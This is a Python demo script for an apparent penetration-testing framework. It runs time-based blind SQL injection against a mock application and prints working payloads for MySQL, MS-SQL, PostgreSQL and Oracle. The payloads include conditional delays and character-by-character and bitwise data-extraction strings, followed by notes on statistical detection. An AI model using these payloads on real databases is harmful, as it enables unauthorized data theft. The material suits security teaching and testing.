#!/usr/bin/env python3
"""
Demo: Time-Based Blind SQL Injection

This script demonstrates the time-based blind SQL injection detection
and extraction capabilities implemented in the Megido SQL Attacker.

Usage:
    python demo_time_based_blind_sqli.py
"""

import time
import sys
import logging
from typing import Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Import the time-based blind detector
try:
    from sql_attacker.time_based_blind_detector import (
        TimeBasedBlindDetector,
        DBMSType
    )
except ImportError:
    print("[!] Error: Could not import time_based_blind_detector module")
    print("[!] Make sure you're running this from the Megido root directory")
    sys.exit(1)


class MockVulnerableApp:
    """
    Mock vulnerable application for demonstration.
    Simulates a web application with time-based blind SQL injection vulnerability.
    """
    
    def __init__(self, dbms_type: DBMSType = DBMSType.MYSQL, 
                 base_latency: float = 0.2, vulnerable: bool = True):
        """
        Initialize mock application.
        
        Args:
            dbms_type: Database type to simulate
            base_latency: Base response latency in seconds
            vulnerable: Whether the app is vulnerable
        """
        self.dbms_type = dbms_type
        self.base_latency = base_latency
        self.vulnerable = vulnerable
        self.database_name = "testdb"
        self.username = "admin"
        
        logger.info(f"Mock app initialized: DBMS={dbms_type.value}, vulnerable={vulnerable}")
    
    def request(self, payload: Optional[str] = None, **kwargs) -> 'MockResponse':
        """
        Simulate HTTP request with SQL injection.
        
        Args:
            payload: SQL injection payload
            **kwargs: Additional parameters (ignored)
        
        Returns:
            MockResponse object
        """
        # Base latency
        delay = self.base_latency
        
        if payload and self.vulnerable:
            # Analyze payload for time-delay functions
            payload_upper = payload.upper()
            
            # Check for time-delay indicators based on DBMS
            should_delay = False
            
            if self.dbms_type == DBMSType.MYSQL:
                if 'SLEEP' in payload_upper:
                    # Extract sleep duration from payload
                    if 'SLEEP(5)' in payload_upper or 'SLEEP(5)' in payload:
                        should_delay = self._evaluate_condition(payload)
                elif 'BENCHMARK' in payload_upper:
                    should_delay = self._evaluate_condition(payload)
            
            elif self.dbms_type == DBMSType.MSSQL:
                if 'WAITFOR DELAY' in payload_upper:
                    should_delay = self._evaluate_condition(payload)
            
            elif self.dbms_type == DBMSType.POSTGRESQL:
                if 'PG_SLEEP' in payload_upper:
                    should_delay = self._evaluate_condition(payload)
            
            elif self.dbms_type == DBMSType.ORACLE:
                if 'UTL_HTTP' in payload_upper or 'DBMS_LOCK.SLEEP' in payload_upper:
                    should_delay = self._evaluate_condition(payload)
            
            # Apply delay if condition is met
            if should_delay:
                delay += 5.0  # 5-second delay
        
        # Simulate request with delay
        time.sleep(delay)
        
        return MockResponse("Normal response content", 200)
    
    def _evaluate_condition(self, payload: str) -> bool:
        """
        Evaluate SQL condition in payload (simplified simulation).
        
        Args:
            payload: SQL injection payload
        
        Returns:
            True if condition should trigger delay, False otherwise
        """
        # Simple heuristics to determine if condition is true
        payload_upper = payload.upper()
        
        # Always false conditions
        if '1=2' in payload or '1=0' in payload:
            return False
        if "'A'='B'" in payload_upper or "'X'='Y'" in payload_upper:
            return False
        if "= 'NONEXISTENT'" in payload_upper:
            return False
        
        # Always true conditions
        if '1=1' in payload or '2=2' in payload:
            return True
        if "'A'='A'" in payload_upper or "'X'='X'" in payload_upper:
            return True
        
        # Character extraction simulation
        if 'ASCII(' in payload_upper and '=' in payload:
            # Simulate checking database name characters
            # Extract position and ASCII code (simplified)
            if self.database_name == "testdb":
                # First character is 't' (ASCII 116)
                if ',1,1))=116' in payload or ',1,1))=116' in payload:
                    return True
                # Second character is 'e' (ASCII 101)
                if ',2,1))=101' in payload or ',2,1))=101' in payload:
                    return True
                # Third character is 's' (ASCII 115)
                if ',3,1))=115' in payload:
                    return True
                # Fourth character is 't' (ASCII 116)
                if ',4,1))=116' in payload:
                    return True
        
        # Default: return False
        return False


class MockResponse:
    """Mock HTTP response"""
    def __init__(self, text: str, status_code: int):
        self.text = text
        self.status_code = status_code


def print_banner():
    """Print demo banner"""
    print("\n" + "=" * 70)
    print("  TIME-BASED BLIND SQL INJECTION DEMONSTRATION")
    print("  Megido SQL Attacker - Advanced Exploitation Framework")
    print("=" * 70)
    print("\nReferences:")
    print("  - Chris Anley (NGSSoftware)")
    print("  - Sherief Hammad (NGSSoftware)")
    print("  - Dafydd Stuttard & Marcus Pinto - 'Web Application Hacker's Handbook'")
    print("=" * 70 + "\n")


def demo_mysql_time_based():
    """Demonstrate MySQL time-based blind SQL injection"""
    print("\n" + "=" * 70)
    print("DEMO 1: MySQL Time-Based Blind SQL Injection (SLEEP)")
    print("=" * 70)
    
    # Create mock vulnerable app
    app = MockVulnerableApp(dbms_type=DBMSType.MYSQL, vulnerable=True)
    
    # Initialize detector
    detector = TimeBasedBlindDetector(
        delay_seconds=5.0,
        threshold_multiplier=0.8,
        baseline_samples=3,
        test_samples=2
    )
    
    print("\n[*] Target: Mock MySQL Application")
    print("[*] Parameter: id")
    print("[*] Method: GET")
    
    # Define test function
    def test_function(payload, **kwargs):
        return app.request(payload=payload)
    
    # Step 1: Establish baseline
    print("\n[STEP 1] Establishing baseline response time...")
    avg_baseline = detector.establish_baseline(test_function)
    print(f"[+] Baseline established: {avg_baseline:.3f}s")
    
    # Step 2: Test for vulnerability
    print("\n[STEP 2] Testing for time-based blind SQL injection...")
    results = detector.test_time_based_injection(
        test_function=test_function,
        url="http://mock-app.test/page",
        param="id",
        param_type="GET",
        dbms_type=DBMSType.MYSQL
    )
    
    if results['vulnerable']:
        print(f"\n[+] ✓ VULNERABLE! Time-based blind SQLi detected!")
        print(f"    Confidence: {results['confidence']:.2%}")
        print(f"    DBMS Type: {results['dbms_type']}")
        print(f"    Avg Baseline: {results['avg_baseline']:.3f}s")
        print(f"    Avg Delayed: {results['avg_delayed']:.3f}s")
        print(f"    Time Difference: {results['time_difference']:.3f}s")
        
        print("\n[STEP 3] Example payloads used:")
        print("    Conditional TRUE:  ' AND IF(1=1, SLEEP(5), 0)--")
        print("    Conditional FALSE: ' AND IF(1=2, SLEEP(5), 0)--")
        
        print("\n[STEP 4] Character extraction example:")
        print("    ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116, SLEEP(5), 0)--")
        print("    Result: 't' (ASCII 116)")
    else:
        print("\n[-] Not vulnerable or detection inconclusive")
    
    # Generate report
    print("\n" + detector.generate_report())


def demo_mssql_time_based():
    """Demonstrate MS-SQL time-based blind SQL injection"""
    print("\n" + "=" * 70)
    print("DEMO 2: MS-SQL Time-Based Blind SQL Injection (WAITFOR DELAY)")
    print("=" * 70)
    
    # Create mock vulnerable app
    app = MockVulnerableApp(dbms_type=DBMSType.MSSQL, vulnerable=True)
    
    # Initialize detector
    detector = TimeBasedBlindDetector(delay_seconds=5.0)
    
    print("\n[*] Target: Mock MS-SQL Application")
    print("[*] Parameter: id")
    
    # Define test function
    def test_function(payload, **kwargs):
        return app.request(payload=payload)
    
    # Establish baseline
    print("\n[STEP 1] Establishing baseline...")
    detector.establish_baseline(test_function)
    
    # Test for vulnerability
    print("\n[STEP 2] Testing with WAITFOR DELAY payloads...")
    results = detector.test_time_based_injection(
        test_function=test_function,
        url="http://mock-app.test/page",
        param="id",
        param_type="GET",
        dbms_type=DBMSType.MSSQL
    )
    
    if results['vulnerable']:
        print(f"\n[+] ✓ VULNERABLE!")
        print(f"    Confidence: {results['confidence']:.2%}")
        
        print("\n[STEP 3] Example MS-SQL payloads:")
        print("    Simple:      '; WAITFOR DELAY '0:0:5'--")
        print("    Conditional: ' IF (1=1) WAITFOR DELAY '0:0:5'--")
        print("    Extraction:  ' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68 WAITFOR DELAY '0:0:5'--")
        
        print("\n[STEP 4] Bitwise extraction example:")
        print("    ' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&128=128 WAITFOR DELAY '0:0:5'--")
        print("    Testing bit 7 (128): Response delayed → Bit is SET")
    else:
        print("\n[-] Not vulnerable")


def demo_postgresql_time_based():
    """Demonstrate PostgreSQL time-based blind SQL injection"""
    print("\n" + "=" * 70)
    print("DEMO 3: PostgreSQL Time-Based Blind SQL Injection (pg_sleep)")
    print("=" * 70)
    
    # Create mock vulnerable app
    app = MockVulnerableApp(dbms_type=DBMSType.POSTGRESQL, vulnerable=True)
    
    print("\n[*] Target: Mock PostgreSQL Application")
    
    print("\n[STEP 1] Example PostgreSQL time-based payloads:")
    print("    Simple:      '; SELECT pg_sleep(5)--")
    print("    Conditional: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--")
    print("    Extraction:  ' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT current_database()),1,1))=112")
    print("                        THEN pg_sleep(5) ELSE pg_sleep(0) END)--")
    
    print("\n[STEP 2] Testing detection...")
    
    # Initialize detector
    detector = TimeBasedBlindDetector(delay_seconds=5.0, baseline_samples=2, test_samples=2)
    
    def test_function(payload, **kwargs):
        return app.request(payload=payload)
    
    detector.establish_baseline(test_function)
    
    results = detector.test_time_based_injection(
        test_function=test_function,
        url="http://mock-app.test/page",
        param="id",
        param_type="GET",
        dbms_type=DBMSType.POSTGRESQL
    )
    
    if results['vulnerable']:
        print(f"\n[+] ✓ VULNERABLE! Confidence: {results['confidence']:.2%}")
    else:
        print("\n[-] Not vulnerable")


def demo_oracle_time_based():
    """Demonstrate Oracle time-based blind SQL injection"""
    print("\n" + "=" * 70)
    print("DEMO 4: Oracle Time-Based Blind SQL Injection (UTL_HTTP/DBMS_LOCK)")
    print("=" * 70)
    
    print("\n[*] Target: Mock Oracle Application")
    
    print("\n[STEP 1] Oracle time-delay techniques:")
    print("\n  A) UTL_HTTP.request (Network Timeout Method):")
    print("     - Attempts HTTP connection to non-existent host")
    print("     - Connection timeout creates observable delay")
    print("     - Example: ' AND (SELECT UTL_HTTP.request('http://192.0.2.1:81/') FROM dual)='x'--")
    
    print("\n  B) DBMS_LOCK.SLEEP (Requires Privileges):")
    print("     - Direct sleep function (like MySQL SLEEP)")
    print("     - Requires EXECUTE on DBMS_LOCK package")
    print("     - Example: ' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual) IS NULL--")
    
    print("\n[STEP 2] Conditional delay examples:")
    print("    UTL_HTTP:  ' AND (SELECT CASE WHEN (1=1)")
    print("                     THEN UTL_HTTP.request('http://192.0.2.1:81/')")
    print("                     ELSE 'ok' END FROM dual)='ok'--")
    print("\n    DBMS_LOCK: ' AND (SELECT CASE WHEN (1=1)")
    print("                     THEN DBMS_LOCK.SLEEP(5)")
    print("                     ELSE 0 END FROM dual) IS NOT NULL--")
    
    print("\n[STEP 3] Character extraction:")
    print("    ' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT user FROM dual),1,1))=83")
    print("          THEN UTL_HTTP.request('http://192.0.2.1:81/')")
    print("          ELSE 'ok' END FROM dual)='ok'--")
    print("    Result: 'S' (ASCII 83) if response is delayed")
    
    print("\n[NOTE] Oracle time-based attacks are less reliable than other DBMS")
    print("       due to network timeout variability with UTL_HTTP method")


def demo_extraction_techniques():
    """Demonstrate data extraction techniques"""
    print("\n" + "=" * 70)
    print("DEMO 5: Data Extraction Techniques Comparison")
    print("=" * 70)
    
    print("\n[TECHNIQUE 1] Character-by-Character Extraction")
    print("=" * 50)
    print("Algorithm:")
    print("  FOR each position (1 to max_length):")
    print("    FOR each ASCII code (32 to 126):")
    print("      Test if character equals ASCII code")
    print("      IF delayed → Character found!")
    
    print("\nPerformance:")
    print("  - ~95 requests per character")
    print("  - 10-character string: ~950 requests")
    print("  - Time: ~82 minutes (with 5s delay)")
    
    print("\nExample (MySQL):")
    print("  Position 1, ASCII 116: ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116, SLEEP(5), 0)--")
    print("  → Delayed! Character is 't'")
    
    print("\n\n[TECHNIQUE 2] Bitwise Extraction (RECOMMENDED)")
    print("=" * 50)
    print("Algorithm:")
    print("  FOR each position:")
    print("    ascii_value = 0")
    print("    FOR each bit (7 down to 0):")
    print("      Test if (character & 2^bit) == 2^bit")
    print("      IF delayed → Set bit in ascii_value")
    
    print("\nPerformance:")
    print("  - Only 8 requests per character")
    print("  - 10-character string: 80 requests")
    print("  - Time: ~7 minutes (with 5s delay)")
    print("  - 91% REDUCTION in requests!")
    
    print("\nExample (MS-SQL):")
    print("  Position 1, Bit 7 (mask=128):")
    print("    ' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&128=128 WAITFOR DELAY '0:0:5'--")
    print("    → Delayed! Bit 7 is SET")
    print("  Position 1, Bit 6 (mask=64):")
    print("    ' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&64=64 WAITFOR DELAY '0:0:5'--")
    print("    → Not delayed. Bit 6 is NOT SET")
    print("  ... continue for all 8 bits ...")
    print("  Result: 01110100 = 116 = 't'")
    
    print("\n\n[PERFORMANCE COMPARISON]")
    print("=" * 50)
    print("String Length | Char-by-Char | Bitwise | Speedup")
    print("-" * 50)
    print("10 chars      | ~950 req     | 80 req  | 91%")
    print("50 chars      | ~4,750 req   | 400 req | 91%")
    print("100 chars     | ~9,500 req   | 800 req | 91%")


def demo_statistical_analysis():
    """Demonstrate statistical analysis for time-based detection"""
    print("\n" + "=" * 70)
    print("DEMO 6: Statistical Analysis for Reliable Detection")
    print("=" * 70)
    
    print("\n[CHALLENGE] Network and Server Variability")
    print("-" * 50)
    print("Issues that affect time-based detection:")
    print("  1. Network latency fluctuations")
    print("  2. Server load variations")
    print("  3. Concurrent request interference")
    print("  4. Application processing time differences")
    
    print("\n[SOLUTION] Multi-Criteria Statistical Analysis")
    print("-" * 50)
    print("The detector uses multiple criteria:")
    
    print("\n  1) Baseline Establishment:")
    print("     - Collect 3-5 normal response times")
    print("     - Calculate mean and standard deviation")
    print("     - Example: 0.200s, 0.221s, 0.198s → mean=0.206s, std=0.012s")
    
    print("\n  2) Threshold Calculation:")
    print("     - Threshold = baseline + (expected_delay × 0.8)")
    print("     - Example: 0.206s + (5s × 0.8) = 4.206s")
    print("     - Response > 4.206s → Considered delayed")
    
    print("\n  3) Multiple Measurements:")
    print("     - Test each payload 2-3 times")
    print("     - Require majority to show delay")
    print("     - Example: 3 tests, 2 must be delayed → 66% threshold")
    
    print("\n  4) Confidence Scoring:")
    print("     - Based on delay magnitude")
    print("     - confidence = min(1.0, time_diff / expected_delay)")
    print("     - Example: 5.2s delay → confidence = 1.0")
    print("     - Example: 4.5s delay → confidence = 0.9")
    
    print("\n  5) True/False Differentiation:")
    print("     - TRUE conditions should delay")
    print("     - FALSE conditions should NOT delay")
    print("     - Both required for high confidence")
    
    print("\n[RESULT] High Reliability Detection")
    print("-" * 50)
    print("  ✓ Minimal false positives")
    print("  ✓ Robust against network noise")
    print("  ✓ Confidence scoring (0-100%)")
    print("  ✓ Adaptive to environment")


def main():
    """Main demo function"""
    print_banner()
    
    try:
        # Run all demonstrations
        demo_mysql_time_based()
        
        input("\nPress Enter to continue to MS-SQL demo...")
        demo_mssql_time_based()
        
        input("\nPress Enter to continue to PostgreSQL demo...")
        demo_postgresql_time_based()
        
        input("\nPress Enter to continue to Oracle demo...")
        demo_oracle_time_based()
        
        input("\nPress Enter to continue to extraction techniques...")
        demo_extraction_techniques()
        
        input("\nPress Enter to continue to statistical analysis...")
        demo_statistical_analysis()
        
        print("\n" + "=" * 70)
        print("DEMO COMPLETE")
        print("=" * 70)
        print("\n[+] Time-based blind SQL injection demonstrations completed!")
        print("\n[INFO] For more details, see:")
        print("  - sql_attacker/TIME_BASED_BLIND_SQLI_GUIDE.md")
        print("  - sql_attacker/time_based_blind_detector.py")
        print("\n[INFO] Run unit tests with:")
        print("  python manage.py test sql_attacker.test_time_based_blind")
        print("\n")
        
    except KeyboardInterrupt:
        print("\n\n[!] Demo interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Demo error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
